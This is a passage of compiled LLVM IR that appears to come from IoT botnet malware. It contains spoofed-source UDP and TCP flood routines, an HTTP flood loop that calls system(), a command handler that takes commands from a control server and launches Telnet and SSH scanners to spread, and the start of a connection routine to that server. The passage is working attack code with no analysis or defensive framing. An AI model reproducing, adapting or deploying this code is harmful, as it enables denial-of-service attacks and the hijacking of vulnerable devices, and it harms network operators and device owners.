  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %59

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i64 0, i64 0))
  br label %.loopexit

; <label>:59:                                     ; preds = %53
  store i32 1, i32* %8, align 4
  %60 = bitcast i32* %8 to i8*
  %61 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* nonnull %60, i32 4) #3
  %62 = icmp slt i32 %61, 0
  br i1 %62, label %63, label %.preheader.preheader

.preheader.preheader:                             ; preds = %59
  br label %.preheader

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.05962 = phi i32 [ %66, %.preheader ], [ 50, %.preheader.preheader ]
  %66 = add nsw i32 %.05962, -1
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %68 = call i32 @rand_cmwc()
  %69 = xor i32 %68, %67
  call void @srand(i32 %69) #3
  %70 = call i32 @rand() #3
  call void @init_rand(i32 %70)
  %71 = icmp eq i32 %66, 0
  br i1 %71, label %72, label %.preheader

; <label>:72:                                     ; preds = %.preheader
  %73 = icmp eq i32 %3, 0
  %74 = sub nsw i32 32, %3
  %75 = shl i32 -1, %74
  %.060 = select i1 %73, i32 0, i32 %75
  %76 = sext i32 %4 to i64
  %77 = add nsw i64 %76, 28
  %78 = call i8* @llvm.stacksave()
  %79 = alloca i8, i64 %77, align 16
  %80 = bitcast i8* %79 to %struct.iphdr*
  %81 = getelementptr i8, i8* %79, i64 20
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = call i32 @getRandomIP(i32 %.060)
  %85 = call i32 @htonl(i32 %84) #17
  %86 = add nsw i64 %76, 8
  %87 = trunc i64 %86 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %80, i32 %83, i32 %85, i8 zeroext 17, i32 %87)
  %88 = trunc i64 %86 to i16
  %89 = call zeroext i16 @htons(i16 zeroext %88) #17
  %90 = getelementptr inbounds i8, i8* %79, i64 24
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 8
  %92 = call i32 @rand_cmwc()
  %93 = trunc i32 %92 to i16
  %94 = bitcast i8* %81 to i16*
  store i16 %93, i16* %94, align 4
  br i1 %10, label %95, label %97

; <label>:95:                                     ; preds = %72
  %96 = call i32 @rand_cmwc()
  br label %101

; <label>:97:                                     ; preds = %72
  %98 = trunc i32 %1 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #17
  %100 = zext i16 %99 to i32
  br label %101

; <label>:101:                                    ; preds = %97, %95
  %102 = phi i32 [ %96, %95 ], [ %100, %97 ]
  %103 = trunc i32 %102 to i16
  %104 = getelementptr inbounds i8, i8* %79, i64 22
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = getelementptr inbounds i8, i8* %79, i64 26
  %107 = bitcast i8* %106 to i16*
  store i16 0, i16* %107, align 2
  %108 = getelementptr inbounds i8, i8* %79, i64 28
  call void @makeRandomStr(i8* %108, i32 %4)
  %109 = bitcast i8* %79 to i16*
  %110 = getelementptr inbounds i8, i8* %79, i64 2
  %111 = bitcast i8* %110 to i16*
  %112 = load i16, i16* %111, align 2
  %113 = zext i16 %112 to i32
  %114 = call zeroext i16 @csum(i16* nonnull %109, i32 %113)
  %115 = getelementptr inbounds i8, i8* %79, i64 10
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %118 = add nsw i32 %117, %2
  %119 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %120 = getelementptr inbounds i8, i8* %79, i64 4
  %121 = bitcast i8* %120 to i16*
  %122 = getelementptr inbounds i8, i8* %79, i64 12
  %123 = bitcast i8* %122 to i32*
  %124 = trunc i32 %1 to i16
  br label %.backedge61

.backedge61:                                      ; preds = %.backedge61.backedge, %101
  %.0 = phi i32 [ 0, %101 ], [ %.0.be, %.backedge61.backedge ]
  %125 = call i64 @sendto(i32 %54, i8* nonnull %79, i64 %77, i32 0, %struct.sockaddr* nonnull %119, i32 16) #3
  %126 = call i32 @rand_cmwc()
  %127 = trunc i32 %126 to i16
  store i16 %127, i16* %94, align 4
  br i1 %10, label %128, label %130

; <label>:128:                                    ; preds = %.backedge61
  %129 = call i32 @rand_cmwc()
  br label %133

; <label>:130:                                    ; preds = %.backedge61
  %131 = call zeroext i16 @htons(i16 zeroext %124) #17
  %132 = zext i16 %131 to i32
  br label %133

; <label>:133:                                    ; preds = %130, %128
  %134 = phi i32 [ %129, %128 ], [ %132, %130 ]
  %135 = trunc i32 %134 to i16
  store i16 %135, i16* %105, align 2
  %136 = call i32 @rand_cmwc()
  %137 = trunc i32 %136 to i16
  store i16 %137, i16* %121, align 4
  %138 = call i32 @getRandomIP(i32 %.060)
  %139 = call i32 @htonl(i32 %138) #17
  store i32 %139, i32* %123, align 4
  %140 = load i16, i16* %111, align 2
  %141 = zext i16 %140 to i32
  %142 = call zeroext i16 @csum(i16* nonnull %109, i32 %141)
  store i16 %142, i16* %116, align 2
  %143 = icmp eq i32 %.0, %5
  br i1 %143, label %144, label %147

; <label>:144:                                    ; preds = %133
  %145 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %146 = icmp sgt i32 %145, %118
  br i1 %146, label %149, label %.backedge61.backedge

; <label>:147:                                    ; preds = %133
  %148 = add i32 %.0, 1
  br label %.backedge61.backedge

.backedge61.backedge:                             ; preds = %147, %144
  %.0.be = phi i32 [ %148, %147 ], [ 0, %144 ]
  br label %.backedge61

; <label>:149:                                    ; preds = %144
  call void @llvm.stackrestore(i8* %78)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %48
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %17, %32, %149, %63, %56, %29
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #17
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %163

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i64 0, i64 0))
  br label %163

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i64 0, i64 0))
  br label %163

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @getRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #17
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i64 0, i64 0)) #14
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #3
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.49, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #3
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.51, i64 0, i64 0)) #14
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.52, i64 0, i64 0)) #14
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.53, i64 0, i64 0)) #14
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #17
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = add nsw i32 %137, %2
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = getelementptr inbounds i8, i8* %45, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = getelementptr inbounds i8, i8* %45, i64 4
  %143 = bitcast i8* %142 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %144 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %139, i32 16) #3
  %145 = call i32 @getRandomIP(i32 %.065)
  %146 = call i32 @htonl(i32 %145) #17
  store i32 %146, i32* %141, align 4
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %143, align 4
  %149 = call i32 @rand_cmwc()
  store i32 %149, i32* %59, align 8
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %152 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %152, i16* %114, align 4
  %153 = load i16, i16* %131, align 2
  %154 = zext i16 %153 to i32
  %155 = call zeroext i16 @csum(i16* nonnull %129, i32 %154)
  store i16 %155, i16* %136, align 2
  %156 = icmp eq i32 %.0, %6
  br i1 %156, label %157, label %160

; <label>:157:                                    ; preds = %.backedge
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %159 = icmp sgt i32 %158, %138
  br i1 %159, label %162, label %.backedge.backedge

; <label>:160:                                    ; preds = %.backedge
  %161 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %160, %157
  %.0.be = phi i32 [ %161, %160 ], [ 0, %157 ]
  br label %.backedge

; <label>:162:                                    ; preds = %157
  call void @llvm.stackrestore(i8* %44)
  br label %163

; <label>:163:                                    ; preds = %18, %162, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8* nocapture readonly, i32) local_unnamed_addr #1 {
  %3 = alloca [80 x i8], align 16
  %4 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %5 = add nsw i32 %4, %1
  %6 = getelementptr inbounds [80 x i8], [80 x i8]* %3, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %6, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.55, i64 0, i64 0), i64 17, i32 1, i1 false)
  %7 = call i8* @strcat(i8* nonnull %6, i8* %0) #3
  %strlen = call i64 @strlen(i8* nonnull %6)
  %endptr = getelementptr [80 x i8], [80 x i8]* %3, i64 0, i64 %strlen
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %endptr, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i64 0, i64 0), i64 14, i32 1, i1 false)
  %8 = call %struct._IO_FILE* @popen(i8* nonnull %6, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i64 0, i64 0))
  %9 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %10 = icmp sgt i32 %5, %9
  br i1 %10, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = call i32 @system(i8* nonnull %6) #3
  %12 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %13 = icmp sgt i32 %5, %12
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @popen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i64 0, i64 0))
  br label %106

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i64 0, i64 0)) #14
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %17

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #3
  %16 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.61, i64 0, i64 0), i8* %15)
  br label %106

; <label>:17:                                     ; preds = %9
  %18 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i64 0, i64 0)) #14
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %106

; <label>:20:                                     ; preds = %17
  %21 = icmp eq i32 %0, 2
  br i1 %21, label %25, label %22

; <label>:22:                                     ; preds = %20
  %23 = load i32, i32* @mainCommSock, align 4
  %24 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %23, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.63, i64 0, i64 0))
  br label %106

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds i8*, i8** %1, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = tail call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i64 0, i64 0)) #14
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %58

; <label>:30:                                     ; preds = %25
  %31 = load i32, i32* @scanPid, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %106, label %33

; <label>:33:                                     ; preds = %30
  %34 = load i32, i32* @mainCommSock, align 4
  %35 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %34, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.65, i64 0, i64 0))
  %36 = load i32, i32* @scanPid, align 4
  %37 = tail call i32 @kill(i32 %36, i32 9) #3
  store i32 0, i32* @scanPid, align 4
  %38 = load i8*, i8** %26, align 8
  %39 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.66, i64 0, i64 0)) #14
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %48

; <label>:41:                                     ; preds = %33
  %42 = tail call i32 @fork() #3
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %43, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i64 0, i64 0))
  %45 = icmp eq i32 %42, 0
  br i1 %45, label %47, label %46

; <label>:46:                                     ; preds = %41
  store i32 %42, i32* @scanPid, align 4
  br label %106

; <label>:47:                                     ; preds = %41
  tail call void @TelnetScan() #3
  unreachable

; <label>:48:                                     ; preds = %33
  %49 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.68, i64 0, i64 0)) #14
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %58

; <label>:51:                                     ; preds = %48
  %52 = tail call i32 @fork() #3
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i64 0, i64 0))
  %55 = icmp eq i32 %52, 0
  br i1 %55, label %57, label %56

; <label>:56:                                     ; preds = %51
  store i32 %52, i32* @scanPid, align 4
  br label %106

; <label>:57:                                     ; preds = %51
  tail call void @secureShellScan() #3
  unreachable

; <label>:58:                                     ; preds = %48, %25
  %59 = load i8*, i8** %1, align 8
  %60 = tail call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i64 0, i64 0)) #14
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %106, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i8*, i8** %1, align 8
  %64 = tail call i32 @strcmp(i8* %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i64 0, i64 0)) #14
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %106, label %66

; <label>:66:                                     ; preds = %62
  %67 = load i8*, i8** %1, align 8
  %68 = tail call i32 @strcmp(i8* %67, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #14
  %69 = icmp eq i32 %68, 0
  br i1 %69, label %106, label %70

; <label>:70:                                     ; preds = %66
  %71 = load i8*, i8** %1, align 8
  %72 = tail call i32 @strcmp(i8* %71, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0)) #14
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %.preheader, label %101

.preheader:                                       ; preds = %70
  %74 = load i64, i64* @numpids, align 8
  %75 = icmp eq i64 %74, 0
  br i1 %75, label %._crit_edge.thread, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

._crit_edge.thread:                               ; preds = %.preheader
  %76 = load i32, i32* @mainCommSock, align 4
  br label %98

.lr.ph:                                           ; preds = %.lr.ph.preheader, %90
  %.0111 = phi i64 [ %91, %90 ], [ 0, %.lr.ph.preheader ]
  %.0100110 = phi i32 [ %.1, %90 ], [ 0, %.lr.ph.preheader ]
  %77 = load i32*, i32** @pids, align 8
  %78 = getelementptr inbounds i32, i32* %77, i64 %.0111
  %79 = load i32, i32* %78, align 4
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %90, label %81

; <label>:81:                                     ; preds = %.lr.ph
  %82 = tail call i32 @getpid() #3
  %83 = icmp eq i32 %79, %82
  br i1 %83, label %90, label %84

; <label>:84:                                     ; preds = %81
  %85 = load i32*, i32** @pids, align 8
  %86 = getelementptr inbounds i32, i32* %85, i64 %.0111
  %87 = load i32, i32* %86, align 4
  %88 = tail call i32 @kill(i32 %87, i32 9) #3
  %89 = add nsw i32 %.0100110, 1
  br label %90

; <label>:90:                                     ; preds = %81, %.lr.ph, %84
  %.1 = phi i32 [ %89, %84 ], [ %.0100110, %81 ], [ %.0100110, %.lr.ph ]
  %91 = add i64 %.0111, 1
  %92 = load i64, i64* @numpids, align 8
  %93 = icmp ult i64 %91, %92
  br i1 %93, label %.lr.ph, label %._crit_edge

._crit_edge:                                      ; preds = %90
  %94 = icmp sgt i32 %.1, 0
  %95 = load i32, i32* @mainCommSock, align 4
  br i1 %94, label %96, label %98

; <label>:96:                                     ; preds = %._crit_edge
  %97 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %95, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i64 0, i64 0), i32 %.1)
  br label %101

; <label>:98:                                     ; preds = %._crit_edge.thread, %._crit_edge
  %99 = phi i32 [ %76, %._crit_edge.thread ], [ %95, %._crit_edge ]
  %100 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %99, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i64 0, i64 0))
  br label %101

; <label>:101:                                    ; preds = %70, %96, %98
  %102 = load i8*, i8** %1, align 8
  %103 = tail call i32 @strcmp(i8* %102, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.75, i64 0, i64 0)) #14
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %101
  tail call void @exit(i32 0) #16
  unreachable

; <label>:106:                                    ; preds = %66, %62, %58, %101, %17, %30, %56, %46, %22, %12, %6
  ret void
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
